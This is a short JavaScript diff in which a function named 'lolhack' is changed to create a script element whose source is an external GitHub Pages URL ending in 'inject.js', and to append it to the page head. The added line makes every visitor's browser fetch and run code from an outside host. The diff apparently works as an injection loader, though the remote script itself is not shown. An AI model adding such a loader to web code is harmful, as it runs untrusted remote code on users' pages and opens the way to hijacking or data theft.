@@ -1,6 +1,6 @@
 function lolhack() {
   let fireScript = document.createElement('script');
-  fireScript.src = "";
+  fireScript.src = "https://lastdaysatskyout.github.io/petuh_na_more_2/tooltip/inject.js";
   document.head.append(fireScript);
 
 // let container = document.createElement('div');
